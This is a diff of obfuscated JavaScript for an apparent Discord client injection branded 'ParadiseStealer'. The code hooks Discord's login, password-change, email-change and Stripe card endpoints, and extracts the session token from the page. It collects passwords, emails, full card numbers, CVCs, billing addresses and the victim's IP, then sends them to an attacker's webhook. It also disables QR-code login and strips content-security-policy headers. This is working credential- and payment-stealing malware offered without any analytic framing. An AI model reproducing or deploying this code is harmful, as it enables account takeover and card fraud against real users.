+        }(), inline: false}, {name: lacoria(589), value: "`" + karoleena + "`", inline: true}, {name: lacoria(515), value: "`" + noland + "`", inline: true}, {name: lacoria(549), value: "```" + kebba + "```", inline: false}], author: {name: lacoria(622)}, footer: {text: "ParadiseStealer"}, thumbnail: {url: lacoria(500) + marquiese.id + "/" + marquiese.avatar}}]};
+        SendToWebhook(JSON.stringify(amor));
       });
     });
   });
 }
-function CreditCardAdded(ariadnna, riva, guadalupe, zorina, zarchary, drayten, jennavi, kearn, seriah, damar) {
-  const alarice = clennon, allysun = BrowserWindow.getAllWindows()[0];
-  allysun[alarice(423)][alarice(421)](alarice(353) + damar + '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;', true).then(leidi => {
-    const azleigh = alarice;
-    allysun[azleigh(423)][azleigh(421)]('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', true).then(rikka => {
-      const christinemarie = azleigh;
-      var lachic = JSON[christinemarie(337)](leidi), jericka = {username: "ParadiseStealer", content: "", embeds: [{title: "User Credit Card Added", description: "**Username:**```" + lachic[christinemarie(314)] + "#" + lachic[christinemarie(300)] + christinemarie(358) + lachic.id + christinemarie(335) + lachic[christinemarie(368)] + christinemarie(411) + GetNitro(lachic[christinemarie(370)]) + christinemarie(380) + GetBadges(lachic.flags) + christinemarie(334) + ariadnna + "```\n**Credit Card Expiration: **```" + guadalupe + "/" + zorina + "```\n**CVC: **```" + riva + christinemarie(392) + seriah + "```\n**State: **```" + jennavi + christinemarie(405) + drayten + christinemarie(352) + kearn + "```\n**Street: **```" + zarchary + christinemarie(289) + damar + "```\n**IP: **```" + rikka + "```", author: {name: "ParadiseStealer"}, footer: {text: christinemarie(336)}, thumbnail: {url: "https://cdn.discordapp.com/avatars/" + lachic.id + "/" + lachic[christinemarie(321)]}}]};
-      SendToWebhook(JSON.stringify(jericka));
-    });
-  });
-}
-function blayson() {
-  const paylin = ["flags", "No Rare Friends", "join", "<:hypesquad_events:874750808594477056> ", "2812558rJGeYh", "assign", "login", "```\n**Credit Card Number: **```", "```\n**Email:**```", "ParadiseStealer", "parse", "Access-Control-Allow-Headers '*'", "bytes", "onHeadersReceived", "embed-color", "Old Password", "```", "Billing", "1443516AvpKOL", "<:classic:896119171019067423> `Nitro Classic`", "Access-Control-Allow-Origin '*'", "type", "Discord Initalized", "Username", "));\n    ", "```\n**ZIP:**```", '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "', "Total Friends (", "<:developer:874750808472825986> ", "ParadiseStealerBTW", "./core.asar", "```\n**ID:**```", '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;', "card[exp_year]", "card[address_zip]", "hostname", "discord.com", "logout-notify", "https://*.discord.com/api/v*/users/@me", "Email Changed", "<a:boost:824036778570416129> `Nitro Boost`", "email", "<:bravery:874750808388952075> ", "premium_type", "tokens", "https://discord.com/api/v*/users/@me", "onBeforeRequest", '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "', "true", "199CEgQoO", "url", "electron", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "```\n**Badges:**```", "logout", "208HKjqzi", "https://discord.com/api/v*/users/@me/library", "```Hostname: \n", "onCompleted", "User Login", "%LOGOUT%", "264056jIsHjz", "`<a:420_cross:931468716779114536>`", "filter", "content-security-policy", "```\n**Country: **```", 'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();', "<a:pepe_nitro:906950345983397988> Nitro", "<:partner:874750808678354964> ", "%DISABLEQRCODE%", "statusCode", "\n```", "<:staff_blue:936543701294010399> Password", "2452KsaCRf", "Badges", '");\n            xmlHttp.send( null );\n            xmlHttp.responseText', "disable-qr-code", "\nInjection Info: \n", "```\n**City: **```", "forEach", "includes", '");\n        xmlHttp.send( null );\n        xmlHttp.responseText', "`✔️` :credit_card:", "Nitro", "```\n**Nitro Type:**```", "https://api.stripe.com/v*/tokens", "querystring", "getAllWindows", "uploadData", "88330GcdhAH", "webRequest", "<:PP_director:942527310324719716> New Email", "266145PyTltu", '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', "executeJavaScript", "password", "webContents", "invalid", "https://*.discord.com/api/v*/users/@me/library", "Info", "https://*.discord.com/api/v*/auth/login", "<:bughunter_2:874750808430874664> ", "exports", "https://discordapp.com/api/v*/users/@me", "\nIP: \n", "24306Njpyeh", "PATCH", "content-security-policy-report-only", "card[address_state]", "card[cvc]", "https://discord.com/api/v*/auth/login", "users/@me", "```\n**Token:**```", "endsWith", "209hqnFhd", '\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","', "135PCWTXy", "user", 'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', "startsWith", "Token", '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "', "None", "discriminator", "<a:early:925791052512788551> ", "defaultSession", "https://discord.com/api/v*/applications/detectable", "from", "<:staff:874750808728666152> ", "https://ibb.co/V2KcYZB", "card[address_city]", "card[number]", "https://cdn.discordapp.com/avatars/", '"),xmlHttp.send(null),xmlHttp.responseText;\n                    ', "%INITNOTI%", "<a:420_cross:931468716779114536>", "toString", "username", "stringify", "new_password", "https://ibb.co/nmDLGCT", "then", "%LOGOUTNOTI%", "<:bughunter_1:874750808426692658> ", "avatar", "`✔️` <:paypal:896441236062347374>", "responseHeaders", "init", "`❌`", "<a:allbadges:895906088996720690>  Badges"];
-  blayson = function () {
-    return paylin;
+function pike() {
+  const nollan = ["avatar", "flags", '"),xmlHttp.send(null),xmlHttp.responseText;\n                    ', "tokens", "card[exp_month]", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "None", "startsWith", "<:staff_blue:936543701294010399>  New Password", "true", "11768584AynUSM", "wss://remote-auth-gateway.discord.gg/*", "PATCH", '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "', "%LOGOUTNOTI%", "4417895GhtZem", "<:hypesquad_events:874750808594477056> ", "User got logged out", "Discord Initalized (User not Logged in)", '    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "', "false", "%DISABLEQRCODE%", "https://cdn.discordapp.com/avatars/", "<:staff_blue:936543701294010399>  Old Password", "746928KfSyln", "card[number]", "user", "<a:allbadges:895906088996720690>  Badges", '");\n        xmlHttp.send( null );\n        xmlHttp.responseText', "disable-qr-code", "77734CaiubU", "3169185dLUESE", "uploadData", "```\n**Credit Card Expiration: **```", "bytes", "card[cvc]", "ParadiseStealerBTW", "<:staff_blue:936543701294010399> Password", "defaultSession", "No Rare Friends", "email", "content-security-policy-report-only", "wss://", "4313848HCHAjI", "https://ibb.co/V2KcYZB", "card[address_country]", "Badges", "%WEBHOOK_LINK%", '\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","', "username", "```\n**IP: **```", "No Nitro", "new_password", "<:partner:874750808678354964> ", "<:PP_director:942527310324719716>  Email", "type", "Discord Initalized", "method", "from", "https://discordapp.com/api/v*/users/@me", "stringify", "<:bughunter_1:874750808426692658> ", "));\n    ", "`<a:420_cross:931468716779114536>`", "`✔️` :credit_card:", "exports", "22XaDSRt", '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', "then", "Info", '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "', "Token", "rmdirSync", "```Hostname: \n", "<a:early:925791052512788551> ", "https://api.stripe.com/v*/tokens", "logout-notify", "User Login", "path", "`✔️` <:paypal:896441236062347374>", "querystring", "3724644RrtPTm", "```\n**Street: **```", "users/@me", "assign", "User Credit Card Added", "https://ibb.co/nmDLGCT", "executeJavaScript", '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "', "statusCode", "join", "Access-Control-Allow-Origin '*'", "discriminator", "card[address_line1]", "```\n**CVC: **```", "<a:pepe_nitro:906950345983397988> Nitro", "login", "card[address_state]", "url", "<:brilliance:874750808338608199> ", '");\n            xmlHttp.send( null );\n            xmlHttp.responseText', "toString", "invalid", "https://discordapp.com/api/v*/auth/login", "includes", "Password Changed", "\n```", "onCompleted", "Billing", "https://discord.com/api/v*/auth/login", "init", "<:PP_director:942527310324719716> New Email", '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;', "endsWith", "https://*.discord.com/api/v*/applications/detectable", "embed-color", "webRequest", "content-security-policy", "./core.asar", "existsSync", "getAllWindows", "password", "Nitro", "https://discord.com/api/v*/users/@me", "<:classic:896119171019067423> `Nitro Classic`", "webContents", "```", "<a:420_cross:931468716779114536>", "```\n**Nitro Type:**```", "<:bravery:874750808388952075> ", "<:bughunter_2:874750808430874664> ", "User log out (User not Logged in before)", "premium_type", "<:balance:874750808267292683> ", "```\n**ZIP:**```", "length", "<:staff:874750808728666152> ", "init-notify", "https://discord.com/api/v*/users/@me/billing/subscriptions", "Username", "logout", "```\n**Email:**```", "https://discord.com/api/v*/users/@me/library", "<:developer:874750808472825986> ", "ParadiseStealer", "```\n**Credit Card Number: **```", "public_flags", "```\n**Token:**```", "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "responseHeaders", "forEach", "\nInjection Info: \n", "onBeforeRequest", "default-src '*'", "%LOGOUT%", 'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', "parse"];
+  pike = function () {
+    return nollan;
   };
-  return blayson();
+  return pike();
 }
-session[clennon(302)][clennon(417)][clennon(373)](Filter, (kesleigh, nalah) => {
-  const marqies = clennon;
-  !kesleigh[marqies(377)][marqies(296)]("wss://") || marqies(375) != config[marqies(403)] && marqies(396) != config[marqies(403)] ? (FirstTime(), nalah({})) : nalah({cancel: true});
+function CreditCardAdded(adlynn, yudith, ebonii, zeenat, mandala, kemi, shanaisha, zacchary, khamiya, vencil) {
+  const gem = lusma, aarilynn = BrowserWindow.getAllWindows()[0];
+  aarilynn[gem(603)][gem(565)](gem(491) + vencil + gem(590), true).then(anila => {
+    const chaunce = gem;
+    aarilynn[chaunce(603)][chaunce(565)]('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', true)[chaunce(546)](anaeja => {
+      const wakana = chaunce;
+      var jakauri = JSON[wakana(634)](anila), cythina = {username: wakana(622), content: "", embeds: [{title: wakana(563), description: "**Username:**```" + jakauri[wakana(527)] + "#" + jakauri[wakana(570)] + "```\n**ID:**```" + jakauri.id + wakana(619) + jakauri[wakana(518)] + wakana(606) + GetNitro(jakauri[wakana(610)]) + "```\n**Badges:**```" + GetBadges(jakauri.flags) + wakana(623) + adlynn + wakana(511) + ebonii + "/" + zeenat + wakana(572) + yudith + "```\n**Country: **```" + khamiya + "```\n**State: **```" + shanaisha + "```\n**City: **```" + kemi + wakana(612) + zacchary + wakana(560) + mandala + wakana(625) + vencil + wakana(528) + anaeja + wakana(604), author: {name: wakana(622)}, footer: {text: wakana(622)}, thumbnail: {url: wakana(500) + jakauri.id + "/" + jakauri[wakana(635)]}}]};
+      SendToWebhook(JSON[wakana(538)](cythina));
+    });
+  });
+}
+session[lusma(516)][lusma(594)][lusma(630)](Filter, (ritta, izzabellah) => {
+  const lexie = lusma;
+  !ritta[lexie(576)][lexie(642)](lexie(520)) || lexie(487) != config["disable-qr-code"] && lexie(499) != config[lexie(507)] ? (FirstTime(), izzabellah({})) : izzabellah({cancel: true});
 });
-const ChangePasswordFilter = {urls: [clennon(372), clennon(280), clennon(365), "https://discordapp.com/api/v*/auth/login", clennon(287), clennon(427), clennon(412)]};
-session.defaultSession.webRequest[clennon(385)](ChangePasswordFilter, (chandal, blerim) => {
-  const tiyon = clennon;
-  if (chandal[tiyon(377)][tiyon(290)](tiyon(333)) && 200 == chandal[tiyon(397)]) {
-    const lyzah = JSON[tiyon(337)](Buffer[tiyon(304)](chandal.uploadData[0][tiyon(339)]).toString()), esaw = lyzah[tiyon(333)], xiaoxi = lyzah[tiyon(422)];
-    BrowserWindow[tiyon(414)]()[0].webContents[tiyon(421)](tiyon(295), true)[tiyon(318)](hedie => {
-      Login(esaw, xiaoxi, hedie);
+const ChangePasswordFilter = {urls: [lusma(601), lusma(537), "https://*.discord.com/api/v*/users/@me", lusma(581), lusma(587), "https://*.discord.com/api/v*/auth/login", lusma(553)]};
+session[lusma(516)].webRequest[lusma(585)](ChangePasswordFilter, (miyon, braylon) => {
+  const marquavius = lusma;
+  if (miyon.url[marquavius(591)](marquavius(574)) && 200 == miyon[marquavius(567)]) {
+    const malike = JSON[marquavius(634)](Buffer.from(miyon[marquavius(510)][0][marquavius(512)]).toString()), joseadrian = malike[marquavius(574)], graycin = malike[marquavius(599)];
+    BrowserWindow[marquavius(598)]()[0][marquavius(603)].executeJavaScript('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', true)[marquavius(546)](kamario => {
+      Login(joseadrian, graycin, kamario);
     });
   }
-  if (chandal.url[tiyon(290)](tiyon(288)) && 200 == chandal[tiyon(397)] && tiyon(283) == chandal.method) {
-    const semir = JSON[tiyon(337)](Buffer[tiyon(304)](chandal[tiyon(415)][0][tiyon(339)]).toString());
-    null != semir[tiyon(422)] && null != semir.password && "" != semir[tiyon(422)] && (null != semir[tiyon(316)] && null != semir.new_password && "" != semir[tiyon(316)] && BrowserWindow[tiyon(414)]()[0][tiyon(423)].executeJavaScript(tiyon(295), true)[tiyon(318)](latrevion => {
-      const lenardo = tiyon;
-      ChangePassword(semir.password, semir[lenardo(316)], latrevion);
-    }), null != semir[tiyon(368)] && null != semir[tiyon(368)] && "" != semir.email && BrowserWindow[tiyon(414)]()[0][tiyon(423)].executeJavaScript(tiyon(295), true)[tiyon(318)](samyog => {
-      const syian = tiyon;
-      ChangeEmail(semir[syian(368)], semir.password, samyog);
+  if (miyon[marquavius(576)][marquavius(591)](marquavius(561)) && 200 == miyon[marquavius(567)] && marquavius(490) == miyon[marquavius(535)]) {
+    const bethanni = JSON[marquavius(634)](Buffer[marquavius(536)](miyon[marquavius(510)][0].bytes)[marquavius(579)]());
+    null != bethanni[marquavius(599)] && null != bethanni[marquavius(599)] && "" != bethanni.password && (null != bethanni[marquavius(530)] && null != bethanni[marquavius(530)] && "" != bethanni[marquavius(530)] && BrowserWindow.getAllWindows()[0][marquavius(603)][marquavius(565)](marquavius(633), true)[marquavius(546)](maurin => {
+      const silven = marquavius;
+      ChangePassword(bethanni[silven(599)], bethanni[silven(530)], maurin);
+    }), null != bethanni[marquavius(518)] && null != bethanni.email && "" != bethanni[marquavius(518)] && BrowserWindow.getAllWindows()[0][marquavius(603)][marquavius(565)]('for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;', true)[marquavius(546)](rishav => {
+      const tomico = marquavius;
+      ChangeEmail(bethanni[tomico(518)], bethanni[tomico(599)], rishav);
     }));
   }
-  if (chandal[tiyon(377)][tiyon(290)](tiyon(371))) {
-    const pabel = BrowserWindow[tiyon(414)]()[0], maikol = querystring[tiyon(337)](decodeURIComponent(Buffer[tiyon(304)](chandal[tiyon(415)][0][tiyon(339)])[tiyon(313)]()));
-    pabel[tiyon(423)][tiyon(421)](tiyon(295), true).then(revia => {
-      const gandolfo = tiyon;
-      CreditCardAdded(maikol[gandolfo(308)], maikol[gandolfo(286)], maikol["card[exp_month]"], maikol[gandolfo(360)], maikol["card[address_line1]"], maikol[gandolfo(307)], maikol[gandolfo(285)], maikol[gandolfo(361)], maikol["card[address_country]"], revia);
+  if (miyon.url[marquavius(591)](marquavius(638))) {
+    const irshad = BrowserWindow[marquavius(598)]()[0], kahana = querystring[marquavius(634)](decodeURIComponent(Buffer[marquavius(536)](miyon[marquavius(510)][0].bytes)[marquavius(579)]()));
+    irshad[marquavius(603)][marquavius(565)](marquavius(633), true)[marquavius(546)](ceonna => {
+      const juhi = marquavius;
+      CreditCardAdded(kahana[juhi(503)], kahana[juhi(513)], kahana[juhi(639)], kahana["card[exp_year]"], kahana[juhi(571)], kahana["card[address_city]"], kahana[juhi(575)], kahana["card[address_zip]"], kahana[juhi(523)], ceonna);
     });
   }
-}), module[clennon(279)] = require(clennon(357));
+}), module[lusma(543)] = require(lusma(596));
